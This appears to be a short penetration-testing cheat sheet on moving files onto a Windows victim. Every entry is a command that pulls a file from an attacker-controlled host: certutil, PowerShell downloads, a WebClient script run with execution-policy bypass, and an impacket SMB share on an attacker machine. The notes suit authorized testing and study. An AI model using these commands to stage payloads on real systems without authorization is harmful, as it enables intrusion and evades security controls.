# File Transfer

## Certutil.exe
```
certutil.exe -urlcache -split -f "http://IP:PORT/file" <output-file>
```

## Powershell
```
powershell Invoke-WebRequest "http://IP:PORT/file" -OutFile "<output-file>"
```

## Powershell wget file
```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = “http://IP:PORT/file” >> wget.ps1
echo $file = “<output-file>” >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1
```
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```
## SMB
on attacker machine (kali)
```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py <share-name> <share-path>
```
on victim machine
```
net use \\ATTACKER-IP\SHARE-NAME
copy \\ATTACKER-IP\SHARE-NAME\file <output-file>
